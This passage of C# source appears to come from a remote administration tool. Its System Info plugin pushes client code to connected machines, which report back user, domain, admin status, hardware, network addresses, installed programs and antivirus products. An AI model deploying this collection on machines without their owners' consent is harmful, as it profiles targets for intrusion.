// File: SystemInfoPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class SystemInfoPlugin : IServerPlugin, IMultiClientPlugin
    {
        private PluginHost _host;
        private SystemInfoUI _sharedUI;
        private readonly object _uiLock = new();
        private readonly ConcurrentDictionary<string, PluginContext> _managedClients = new();

        public string PluginId => "sysinfo";
        public string DisplayName => "System Info";
        public string Version => "1.0.0";
        public string Description => "Gather detailed system information from remote clients including OS, hardware, storage, network, software and security status.";

        private const byte OP_REQUEST_INFO = 0x01;
        private const byte CLIENT_READY = 0xFE;
        private const byte CLIENT_INFO = 0x02;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _host.Log("[SYSINFO] Plugin initialized v1.0");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            lock (_uiLock) { _sharedUI?.Dispose(); _sharedUI = null; }
            _managedClients.Clear();
            return Task.CompletedTask;
        }

        public UserControl CreateSharedUI()
        {
            lock (_uiLock)
            {
                if (_sharedUI != null)
                    return _sharedUI;

                _sharedUI = new SystemInfoUI(this);

                foreach (var cid in _managedClients.Keys)
                    _sharedUI.OnClientAdded(cid);

                return _sharedUI;
            }
        }

        public void AddClient(string clientId, PluginContext context)
        {
            _managedClients[clientId] = context;
            lock (_uiLock) { _sharedUI?.OnClientAdded(clientId); }
        }

        public void RemoveClient(string clientId)
        {
            _managedClients.TryRemove(clientId, out _);
            lock (_uiLock) { _sharedUI?.OnClientRemoved(clientId); }
        }

        public void RemoveAllClients()
        {
            var ids = _managedClients.Keys.ToList();
            foreach (var id in ids) RemoveClient(id);
        }

        public List<string> GetManagedClientIds() => _managedClients.Keys.ToList();

        public UserControl CreateUI(PluginContext context)
        {
            AddClient(context.ClientId, context);
            return CreateSharedUI();
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            SystemInfoUI ui;
            lock (_uiLock) { ui = _sharedUI; }
            if (ui == null) return Task.CompletedTask;

            byte ind = data[0];
            byte[] payload = data.Length > 1 ? data.AsSpan(1).ToArray() : Array.Empty<byte>();

            switch (ind)
            {
                case CLIENT_READY:
                    _host.Log("[SYSINFO] " + clientId + " ready");
                    break;
                case CLIENT_INFO:
                    ui.OnSystemInfoReceived(clientId, payload);
                    break;
            }
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            RemoveClient(clientId);
            return Task.CompletedTask;
        }

        public void RequestInfo(string cid) => Send(cid, OP_REQUEST_INFO, null);

        private void Send(string cid, byte op, byte[] payload)
        {
            int len = payload?.Length ?? 0;
            byte[] data = new byte[1 + len];
            data[0] = op;
            if (payload != null) Buffer.BlockCopy(payload, 0, data, 1, len);
            _host.SendPluginDataToClient(cid, PluginId, data);
        }

        public void Dispose()
        {
            lock (_uiLock) { _sharedUI?.Dispose(); _sharedUI = null; }
            _managedClients.Clear();
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ClientPlugin_sysinfo
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private Func<Task<byte[]>> _receive;
        private CancellationTokenSource _cts = new CancellationTokenSource();

        public async Task Run(Func<byte[], Task> send, Func<Task<byte[]>> receive)
        {
            _send = send;
            _receive = receive;

            await _send(new byte[] { 0xFE });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await _receive();
                    if (data == null || data.Length == 0) break;

                    byte opcode = data[0];

                    if (opcode == 0x01)
                    {
                        string info = GatherSystemInfo();
                        byte[] infoBytes = Encoding.UTF8.GetBytes(info);
                        byte[] response = new byte[1 + infoBytes.Length];
                        response[0] = 0x02;
                        Buffer.BlockCopy(infoBytes, 0, response, 1, infoBytes.Length);
                        await _send(response);
                    }
                }
            }
            catch { }
        }

        private string GatherSystemInfo()
        {
            List<string> lines = new List<string>();

            try { lines.Add(""ComputerName="" + Environment.MachineName); } catch { }
            try { lines.Add(""UserName="" + Environment.UserName); } catch { }
            try { lines.Add(""UserDomain="" + Environment.UserDomainName); } catch { }
            try { lines.Add(""Is64Bit="" + (Environment.Is64BitOperatingSystem ? ""Yes"" : ""No"")); } catch { }
            try { lines.Add(""ProcessorCount="" + Environment.ProcessorCount); } catch { }
            try { lines.Add(""SystemDirectory="" + Environment.SystemDirectory); } catch { }
            try { lines.Add(""CLRVersion="" + Environment.Version); } catch { }

            // OS version - use RtlGetVersion to get real version
            try
            {
                RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
                osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(typeof(RTL_OSVERSIONINFOEX));
                if (RtlGetVersion(out osvi) == 0)
                {
                    lines.Add(""OSVersion="" + osvi.dwMajorVersion + ""."" + osvi.dwMinorVersion + ""."" + osvi.dwBuildNumber);
                    string edition = GetOSEdition(osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
                    lines.Add(""OSEdition="" + edition);
                }
            }
            catch { }

            // Uptime
            try
            {
                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount & int.MaxValue);
                lines.Add(""Uptime="" + (int)uptime.TotalDays + ""d "" + uptime.Hours + ""h "" + uptime.Minutes + ""m"");
            }
            catch { }

            // Admin status
            try
            {
                bool isAdmin = new System.Security.Principal.WindowsPrincipal(
                    System.Security.Principal.WindowsIdentity.GetCurrent())
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                lines.Add(""IsAdmin="" + (isAdmin ? ""Yes"" : ""No""));
            }
            catch { }

            // .NET version
            try { lines.Add(""DotNetVersion="" + GetDotNetVersion()); } catch { }

            // System locale
            try
            {
                lines.Add(""SystemLocale="" + CultureInfo.InstalledUICulture.DisplayName);
                lines.Add(""InputLocale="" + CultureInfo.CurrentCulture.DisplayName);
            }
            catch { }

            // Time zone
            try { lines.Add(""TimeZone="" + TimeZoneInfo.Local.DisplayName); } catch { }

            // WMI-based info
            try { CollectWmiInfo(lines); } catch { }

            // Storage
            try { CollectStorageInfo(lines); } catch { }

            // Network
            try { CollectNetworkInfo(lines); } catch { }

            // Installed programs
            try { CollectInstalledPrograms(lines); } catch { }

            // Antivirus
            try { CollectAntivirusInfo(lines); } catch { }

            return string.Join(""\n"", lines.ToArray());
        }

        [DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct RTL_OSVERSIONINFOEX
        {
            public uint dwOSVersionInfoSize;
            public uint dwMajorVersion;
            public uint dwMinorVersion;
            public uint dwBuildNumber;
            public uint dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public ushort wServicePackMajor;
            public ushort wServicePackMinor;
            public ushort wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }

        private string GetOSEdition(uint major, uint minor, uint build)
        {
            if (major == 10 && build >= 22000) return ""Windows 11"";
            if (major == 10 && build >= 10240) return ""Windows 10"";
            if (major == 6 && minor == 3) return ""Windows 8.1"";
            if (major == 6 && minor == 2) return ""Windows 8"";
            if (major == 6 && minor == 1) return ""Windows 7"";
            if (major == 6 && minor == 0) return ""Windows Vista"";
            if (major == 5 && minor == 2) return ""Windows Server 2003/XP 64"";
            if (major == 5 && minor == 1) return ""Windows XP"";
            return ""Windows "" + major + ""."" + minor;
        }

        private void CollectWmiInfo(List<string> lines)
        {
            try
            {
                System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT * FROM Win32_OperatingSystem"");
                foreach (System.Management.ManagementObject obj in searcher.Get())
                {
                    try
                    {
                        string caption = obj[""Caption""] != null ? obj[""Caption""].ToString().Trim() : """";
                        if (!string.IsNullOrEmpty(caption))
                            lines.Add(""OSName="" + caption);
                    }
                    catch { }
                    try
                    {
                        string installDate = obj[""InstallDate""] != null ? obj[""InstallDate""].ToString() : """";
                        if (installDate.Length >= 8)
                        {
                            try
                            {
                                string d = installDate.Substring(0, 4) + ""-"" + installDate.Substring(4, 2) + ""-"" + installDate.Substring(6, 2);
                                lines.Add(""OSInstallDate="" + d);
                            }
                            catch { }
                        }
                    }
                    catch { }
                    try
                    {
                        object freeMem = obj[""FreePhysicalMemory""];
                        if (freeMem != null)
                        {
                            double gb = double.Parse(freeMem.ToString()) / 1024.0 / 1024.0;
                            lines.Add(""RAMFree="" + gb.ToString(""F1"") + "" GB"");
                        }
                    }
                    catch { }
                    try
                    {
                        object totalVisMem = obj[""TotalVisibleMemorySize""];
                        if (totalVisMem != null)
                        {
                            double mb = double.Parse(totalVisMem.ToString()) / 1024.0 / 1024.0;
                            lines.Add(""RAMTotal="" + mb.ToString(""F1"") + "" GB"");
                        }
                    }
                    catch { }
                    obj.Dispose();
                }
                searcher.Dispose();
            }
            catch { }

            // CPU
            try
            {
                System.Management.ManagementObjectSearcher cpuSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed FROM Win32_Processor"");
                int cpuIdx = 0;
                foreach (System.Management.ManagementObject obj in cpuSearcher.Get())
                {
                    string name = obj[""Name""] != null ? obj[""Name""].ToString().Trim() : """";
                    string cores = obj[""NumberOfCores""] != null ? obj[""NumberOfCores""].ToString() : ""?"";
                    string threads = obj[""NumberOfLogicalProcessors""] != null ? obj[""NumberOfLogicalProcessors""].ToString() : ""?"";
                    string speed = obj[""MaxClockSpeed""] != null ? obj[""MaxClockSpeed""].ToString() : """";
                    if (cpuIdx == 0)
                    {
                        lines.Add(""CPUName="" + name);
                        lines.Add(""CPUCores="" + cores + ""C/"" + threads + ""T"");
                        if (!string.IsNullOrEmpty(speed))
                            lines.Add(""CPUSpeed="" + speed + "" MHz"");
                    }
                    cpuIdx++;
                    obj.Dispose();
                }
                cpuSearcher.Dispose();
            }
            catch { }

            // GPU
            try
            {
                System.Management.ManagementObjectSearcher gpuSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Name, DriverVersion, AdapterRAM FROM Win32_VideoController"");
                int gpuIdx = 0;
                foreach (System.Management.ManagementObject obj in gpuSearcher.Get())
                {
                    string name = obj[""Name""] != null ? obj[""Name""].ToString().Trim() : """";
                    if (gpuIdx == 0)
                    {
                        lines.Add(""GPUName="" + name);
                        string drv = obj[""DriverVersion""] != null ? obj[""DriverVersion""].ToString() : """";
                        if (!string.IsNullOrEmpty(drv))
                            lines.Add(""GPUDriver="" + drv);
                        object ramObj = obj[""AdapterRAM""];
                        if (ramObj != null)
                        {
                            long ramBytes = Convert.ToInt64(ramObj);
                            if (ramBytes > 0)
                                lines.Add(""GPUVRAM="" + (ramBytes / 1024.0 / 1024.0 / 1024.0).ToString(""F1"") + "" GB"");
                        }
                    }
                    gpuIdx++;
                    obj.Dispose();
                }
                gpuSearcher.Dispose();
            }
            catch { }

            // Motherboard
            try
            {
                System.Management.ManagementObjectSearcher mbSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Manufacturer, Product, SerialNumber FROM Win32_BaseBoard"");
                foreach (System.Management.ManagementObject obj in mbSearcher.Get())
                {
                    string mfr = obj[""Manufacturer""] != null ? obj[""Manufacturer""].ToString().Trim() : """";
                    string prod = obj[""Product""] != null ? obj[""Product""].ToString().Trim() : """";
                    if (!string.IsNullOrEmpty(mfr) || !string.IsNullOrEmpty(prod))
                        lines.Add(""Motherboard="" + mfr + "" "" + prod);
                    obj.Dispose();
                }
                mbSearcher.Dispose();
            }
            catch { }

            // BIOS
            try
            {
                System.Management.ManagementObjectSearcher biosSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT SMBIOSBIOSVersion, ReleaseDate FROM Win32_BIOS"");
                foreach (System.Management.ManagementObject obj in biosSearcher.Get())
                {
                    string ver = obj[""SMBIOSBIOSVersion""] != null ? obj[""SMBIOSBIOSVersion""].ToString().Trim() : """";
                    if (!string.IsNullOrEmpty(ver))
                        lines.Add(""BIOSVersion="" + ver);
                    obj.Dispose();
                }
                biosSearcher.Dispose();
            }
            catch { }

            // Total physical RAM from Win32_ComputerSystem
            try
            {
                System.Management.ManagementObjectSearcher csSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"");
                foreach (System.Management.ManagementObject obj in csSearcher.Get())
                {
                    object mem = obj[""TotalPhysicalMemory""];
                    if (mem != null)
                    {
                        double gb = Convert.ToDouble(mem) / 1024.0 / 1024.0 / 1024.0;
                        lines.Add(""PhysicalRAM="" + gb.ToString(""F1"") + "" GB"");
                    }
                    obj.Dispose();
                }
                csSearcher.Dispose();
            }
            catch { }
        }

        private void CollectStorageInfo(List<string> lines)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            int count = 0;
            foreach (DriveInfo d in drives)
            {
                try
                {
                    if (!d.IsReady) continue;
                    string label = !string.IsNullOrEmpty(d.VolumeLabel) ? d.VolumeLabel : """";
                    string format = d.DriveFormat;
                    long totalGB = d.TotalSize / 1024 / 1024 / 1024;
                    long freeGB = d.AvailableFreeSpace / 1024 / 1024 / 1024;
                    string type = d.DriveType.ToString();
                    lines.Add(""DRIVE|"" + d.Name.TrimEnd('\\') + ""|"" + label + ""|"" + totalGB + "" GB|"" + freeGB + "" GB|"" + format + ""|"" + type);
                    count++;
                }
                catch { }
            }
            lines.Add(""DriveCount="" + count);
        }

        private void CollectNetworkInfo(List<string> lines)
        {
            int count = 0;
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                try
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

                    IPInterfaceProperties props = ni.GetIPProperties();
                    UnicastIPAddressInformationCollection addrs = props.UnicastAddresses;

                    string ips = """";
                    foreach (UnicastIPAddressInformation addr in addrs)
                    {
                        if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            if (ips.Length > 0) ips += "","";
                            ips += addr.Address.ToString();
                        }
                    }
                    if (string.IsNullOrEmpty(ips)) continue;

                    string mac = ni.GetPhysicalAddress().ToString();
                    if (mac.Length > 0)
                    {
                        mac = string.Join("":"", Enumerable.Range(0, mac.Length / 2)
                            .Select(i => mac.Substring(i * 2, 2)));
                    }

                    string dns = """";
                    foreach (IPAddress dnsAddr in props.DnsAddresses)
                    {
                        if (dns.Length > 0) dns += "","";
                        dns += dnsAddr.ToString();
                    }

                    lines.Add(""NET|"" + ni.Name + ""|"" + ips + ""|"" + mac + ""|"" + dns);
                    count++;
                }
                catch { }
            }
            lines.Add(""NetAdapterCount="" + count);
        }

        private void CollectInstalledPrograms(List<string> lines)
        {
            List<string> programs = new List<string>();
            string[] registryPaths = new string[]
            {
                @""SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"",
                @""SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall""
            };

            foreach (string regPath in registryPaths)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, false))
                    {
                        if (key == null) continue;
                        foreach (string subKeyName in key.GetSubKeyNames())
                        {
                            try
                            {
                                using (RegistryKey subKey = key.OpenSubKey(subKeyName, false))
                                {
                                    if (subKey == null) continue;
                                    object nameObj = subKey.GetValue(""DisplayName"");
                                    if (nameObj == null) continue;
                                    string name = nameObj.ToString().Trim();
                                    if (string.IsNullOrEmpty(name)) continue;
                                    object verObj = subKey.GetValue(""DisplayVersion"");
                                    string ver = verObj != null ? verObj.ToString().Trim() : """";
                                    if (programs.Count < 300)
                                        programs.Add(name + (ver.Length > 0 ? "" ("" + ver + "")"" : """"));
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }

            lines.Add(""InstalledProgramCount="" + programs.Count);
            foreach (string prog in programs)
                lines.Add(""PROG|"" + prog);
        }

        private void CollectAntivirusInfo(List<string> lines)
        {
            try
            {
                System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(
                    @""\\"" + Environment.MachineName + @""\root\SecurityCenter2"",
                    ""SELECT * FROM AntivirusProduct"");
                List<string> avs = new List<string>();
                foreach (System.Management.ManagementObject obj in searcher.Get())
                {
                    object nameObj = obj[""displayName""];
                    if (nameObj != null)
                    {
                        string name = nameObj.ToString().Trim();
                        if (!string.IsNullOrEmpty(name))
                            avs.Add(name);
                    }
                    obj.Dispose();
                }
                searcher.Dispose();
                    if (avs.Count > 0)
                    lines.Add(""Antivirus="" + string.Join("", "", avs.ToArray()));
                else
                    lines.Add(""Antivirus=None detected"");
            }
            catch
            {
                lines.Add(""Antivirus=Unable to query"");
            }
        }

        private string GetDotNetVersion()
        {
            try
            {
                using (RegistryKey ndpKey = Registry.LocalMachine.OpenSubKey(
                    @""SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"", false))
                {
                    if (ndpKey == null) return ""Not installed"";
                    object relObj = ndpKey.GetValue(""Release"");
                    if (relObj == null) return ""4.0+"";
                    int release = (int)relObj;
                    if (release >= 533320) return ""4.8.1"";
                    if (release >= 528040) return ""4.8"";
                    if (release >= 461808) return ""4.7.2"";
                    if (release >= 461308) return ""4.7.1"";
                    if (release >= 460798) return ""4.7"";
                    if (release >= 394802) return ""4.6.2"";
                    if (release >= 394254) return ""4.6.1"";
                    if (release >= 393295) return ""4.6"";
                    if (release >= 379893) return ""4.5.2"";
                    if (release >= 378675) return ""4.5.1"";
                    if (release >= 378389) return ""4.5"";
                    return ""4.0+"";
                }
            }
            catch { return ""Unknown""; }
        }
    }
}";
        }
    }

    public class SystemInfoUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];

        private Color BgColor => C("BackgroundColor");
        private Color SurfaceColor => C("SurfaceColor");
        private Color SurfaceLightColor => C("SurfaceLightColor");
        private Color BorderClr => C("BorderColor");
        private Color TextPrimary => C("TextPrimaryColor");
        private Color TextSecondary => C("TextSecondaryColor");
        private Color AccentBlue => C("PrimaryColor");
        private Color PrimaryHoverColor => C("PrimaryHoverColor");

        private readonly SystemInfoPlugin _plugin;
        private readonly ConcurrentDictionary<string, PluginContext> _clients = new();
        private readonly ConcurrentDictionary<string, string> _clientInfo = new();

        private readonly ListBox _clientList;
        private readonly TextBlock _statusLabel;
        private readonly ItemsControl _infoTree;
        private readonly StackPanel _infoPanel;
        private readonly Button _refreshBtn;

        private string _selectedClient = null;
        private int _refreshVersion = 0;
        private readonly ConcurrentDictionary<string, int> _clientVersion = new();

        public SystemInfoUI(SystemInfoPlugin plugin)
        {
            _plugin = plugin;
            Background = new SolidColorBrush(BgColor);

            var root = new Grid { Margin = new Thickness(0) };
            root.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(220) });
            root.ColumnDefinitions.Add(new ColumnDefinition { Width = GridLength.Auto });
            root.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1, GridUnitType.Star) });

            // Left sidebar: client list
            var sidebar = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0, 0, 1, 0)
            };

            var sidebarStack = new StackPanel { Margin = new Thickness(0) };

            var sideHeader = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                Padding = new Thickness(10, 8, 10, 8),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0, 0, 0, 1)
            };
            sideHeader.Child = new TextBlock
            {
                Text = "CLIENTS",
                FontSize = 11,
                FontWeight = FontWeights.Bold,
                Foreground = new SolidColorBrush(TextSecondary)
            };
            sidebarStack.Children.Add(sideHeader);

            _clientList = new ListBox
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderThickness = new Thickness(0),
                Foreground = new SolidColorBrush(TextPrimary),
                FontSize = 12,
                Padding = new Thickness(0),
                Margin = new Thickness(0)
            };
            _clientList.SelectionChanged += (s, e) =>
            {
                if (_clientList.SelectedItem is ListBoxItem item && item.Tag is string cid)
                {
                    _selectedClient = cid;
                    ShowInfoForClient(cid);
                }
            };
            sidebarStack.Children.Add(_clientList);
            sidebar.Child = sidebarStack;
            Grid.SetColumn(sidebar, 0);
            root.Children.Add(sidebar);

            // Splitter
            var splitter = new GridSplitter
            {
                Width = 3,
                Background = new SolidColorBrush(BorderClr),
                HorizontalAlignment = HorizontalAlignment.Stretch,
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0)
            };
            Grid.SetColumn(splitter, 1);
            root.Children.Add(splitter);

            // Right panel: info display
            var rightPanel = new Grid { Background = new SolidColorBrush(BgColor) };
            rightPanel.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            rightPanel.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            rightPanel.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            // Toolbar
            var toolbar = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(10, 6, 10, 6)
            };
            var toolbarStack = new StackPanel { Orientation = Orientation.Horizontal };

            _refreshBtn = MakeButton("REFRESH", AccentBlue);
            _refreshBtn.Click += (s, e) => RefreshSelected();
            toolbarStack.Children.Add(_refreshBtn);

            _statusLabel = new TextBlock
            {
                Text = "Select a client and click Refresh",
                FontSize = 11,
                Foreground = new SolidColorBrush(TextSecondary),
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(10, 0, 0, 0)
            };
            toolbarStack.Children.Add(_statusLabel);
            toolbar.Child = toolbarStack;
            Grid.SetRow(toolbar, 0);
            rightPanel.Children.Add(toolbar);

            // Info panel with scroll
            var scroll = new ScrollViewer
            {
                Background = new SolidColorBrush(BgColor),
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(10),
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled
            };

            _infoPanel = new StackPanel { Margin = new Thickness(0) };
            _infoTree = new ItemsControl
            {
                ItemsPanel = new ItemsPanelTemplate(),
                ItemTemplate = null
            };
            scroll.Content = _infoPanel;
            Grid.SetRow(scroll, 1);
            rightPanel.Children.Add(scroll);

            // Status bar at bottom
            var statusBar = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0, 1, 0, 0),
                Padding = new Thickness(10, 4, 10, 4),
                Height = 26
            };
            var statusText = new TextBlock
            {
                Text = "System Info v1.0",
                FontSize = 10,
                Foreground = new SolidColorBrush(TextSecondary),
                VerticalAlignment = VerticalAlignment.Center
            };
            statusBar.Child = statusText;
            Grid.SetRow(statusBar, 2);
            rightPanel.Children.Add(statusBar);

            Grid.SetColumn(rightPanel, 2);
            root.Children.Add(rightPanel);

            Content = root;
        }

        private Button MakeButton(string text, Color bgColor)
        {
            var btn = new Button
            {
                Content = new TextBlock
                {
                    Text = text,
                    FontSize = 12,
                    FontWeight = FontWeights.SemiBold,
                    Foreground = new SolidColorBrush(C("TextPrimaryColor"))
                },
                Background = new SolidColorBrush(bgColor),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(1),
                Padding = new Thickness(10, 5, 10, 5),
                Cursor = Cursors.Hand,
                FontFamily = new FontFamily("Segoe UI")
            };
            var hover = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hover.Setters.Add(new Setter(Control.BackgroundProperty, new SolidColorBrush(PrimaryHoverColor)));
            var trigger = new Style(typeof(Button));
            trigger.Triggers.Add(hover);
            btn.Style = trigger;
            return btn;
        }

        public void OnClientAdded(string clientId)
        {
            if (!Application.Current.Dispatcher.CheckAccess())
            {
                Application.Current.Dispatcher.BeginInvoke(new Action(() => OnClientAdded(clientId)));
                return;
            }
            var item = new ListBoxItem
            {
                Content = new TextBlock { Text = clientId, FontSize = 11, Foreground = new SolidColorBrush(TextPrimary) },
                Tag = clientId,
                Padding = new Thickness(8, 4, 8, 4),
                Background = new SolidColorBrush(SurfaceColor),
                BorderThickness = new Thickness(0)
            };
            item.MouseEnter += (s, e) => item.Background = new SolidColorBrush(SurfaceLightColor);
            item.MouseLeave += (s, e) => item.Background = new SolidColorBrush(SurfaceColor);
            _clientList.Items.Add(item);
            if (_clientList.Items.Count == 1)
                _clientList.SelectedItem = item;
        }

        public void OnClientRemoved(string clientId)
        {
            var toRemove = _clientList.Items.OfType<ListBoxItem>().FirstOrDefault(i => (string)i.Tag == clientId);
            if (toRemove != null)
                _clientList.Items.Remove(toRemove);
            _clientInfo.TryRemove(clientId, out _);
            if (_selectedClient == clientId)
            {
                _selectedClient = null;
                _infoPanel.Children.Clear();
                _statusLabel.Text = "Client disconnected";
            }
        }

        private async void RefreshSelected()
        {
            if (_selectedClient == null) return;
            _refreshBtn.IsEnabled = false;
            _statusLabel.Text = "Requesting system info...";
            _infoPanel.Children.Clear();
            _infoPanel.Children.Add(new TextBlock
            {
                Text = "Waiting for response...",
                FontSize = 11,
                Foreground = new SolidColorBrush(TextSecondary),
                Margin = new Thickness(0, 20, 0, 0),
                HorizontalAlignment = HorizontalAlignment.Center
            });
            int ver = ++_refreshVersion;
            _clientVersion[_selectedClient] = ver;
            _plugin.RequestInfo(_selectedClient);
            await Task.Delay(100);
            _refreshBtn.IsEnabled = true;
        }

        public void OnSystemInfoReceived(string clientId, byte[] payload)
        {
            if (!(Application.Current.Dispatcher.CheckAccess()))
            {
                Application.Current.Dispatcher.BeginInvoke(new Action(() => OnSystemInfoReceived(clientId, payload)));
                return;
            }

            string text = Encoding.UTF8.GetString(payload);
            _clientInfo[clientId] = text;

            if (clientId == _selectedClient)
            {
                int storedVer;
                if (_clientVersion.TryGetValue(clientId, out storedVer) && storedVer == _refreshVersion)
                    DisplayInfo(text);
                else if (!_clientVersion.ContainsKey(clientId))
                    DisplayInfo(text);
            }
        }

        private void ShowInfoForClient(string clientId)
        {
            if (_clientInfo.TryGetValue(clientId, out string info))
            {
                DisplayInfo(info);
                _statusLabel.Text = "System info loaded";
            }
            else
            {
                _infoPanel.Children.Clear();
                _infoPanel.Children.Add(new TextBlock
                {
                    Text = "Click Refresh to gather system information",
                    FontSize = 11,
                    Foreground = new SolidColorBrush(TextSecondary),
                    Margin = new Thickness(0, 20, 0, 0),
                    HorizontalAlignment = HorizontalAlignment.Center
                });
                _statusLabel.Text = "No data - click Refresh";
            }
        }

        private void DisplayInfo(string rawInfo)
        {
            _infoPanel.Children.Clear();

            var lines = rawInfo.Split('\n');
            var categories = new Dictionary<string, List<KeyValuePair<string, string>>>();
            var progList = new List<string>();
            var drives = new List<string>();
            var nets = new List<string>();

            string currentCategory = "General";
            categories[currentCategory] = new List<KeyValuePair<string, string>>();

            foreach (string line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                if (trimmed.StartsWith("PROG|"))
                {
                    progList.Add(trimmed.Substring(5));
                    continue;
                }
                if (trimmed.StartsWith("DRIVE|"))
                {
                    drives.Add(trimmed.Substring(6));
                    continue;
                }
                if (trimmed.StartsWith("NET|"))
                {
                    nets.Add(trimmed.Substring(4));
                    continue;
                }

                int eqIdx = trimmed.IndexOf('=');
                if (eqIdx < 0) continue;

                string key = trimmed.Substring(0, eqIdx);
                string val = trimmed.Substring(eqIdx + 1);

                if (key == "OSName") currentCategory = "Operating System";
                else if (key == "CPUName") currentCategory = "Hardware";
                else if (key == "DriveCount") currentCategory = "Storage";
                else if (key == "NetAdapterCount") currentCategory = "Network";
                else if (key == "InstalledProgramCount") currentCategory = "Software";
                else if (key == "Antivirus") currentCategory = "Security";

                if (!categories.ContainsKey(currentCategory))
                    categories[currentCategory] = new List<KeyValuePair<string, string>>();

                categories[currentCategory].Add(new KeyValuePair<string, string>(key, val));
            }

            foreach (var cat in categories)
            {
                if (cat.Key == "Storage" || cat.Key == "Network" || cat.Key == "Software" || cat.Key == "Security")
                    continue;

                AddCategoryHeader(cat.Key);

                foreach (var kvp in cat.Value)
                    AddInfoRow(kvp.Key, kvp.Value);
            }

            // Storage section
            if (drives.Count > 0)
            {
                AddCategoryHeader("Storage");

                var driveHeader = new Border
                {
                    Background = new SolidColorBrush(SurfaceLightColor),
                    Padding = new Thickness(8, 3, 8, 3),
                    Margin = new Thickness(8, 0, 8, 2),
                    CornerRadius = new CornerRadius(3)
                };
                var driveGrid = new WrapPanel { Orientation = Orientation.Horizontal };
                driveGrid.Children.Add(MakeCol("Drive", 80));
                driveGrid.Children.Add(MakeCol("Label", 120));
                driveGrid.Children.Add(MakeCol("Size", 80));
                driveGrid.Children.Add(MakeCol("Free", 80));
                driveGrid.Children.Add(MakeCol("Format", 60));
                driveGrid.Children.Add(MakeCol("Type", 80));
                driveHeader.Child = driveGrid;
                _infoPanel.Children.Add(driveHeader);

                foreach (string d in drives)
                {
                    string[] parts = d.Split('|');
                    if (parts.Length < 6) continue;
                    var row = new Border
                    {
                        Background = new SolidColorBrush(SurfaceColor),
                        Padding = new Thickness(8, 2, 8, 2),
                        Margin = new Thickness(8, 0, 8, 1),
                        CornerRadius = new CornerRadius(2)
                    };
                    var rowPanel = new WrapPanel { Orientation = Orientation.Horizontal };
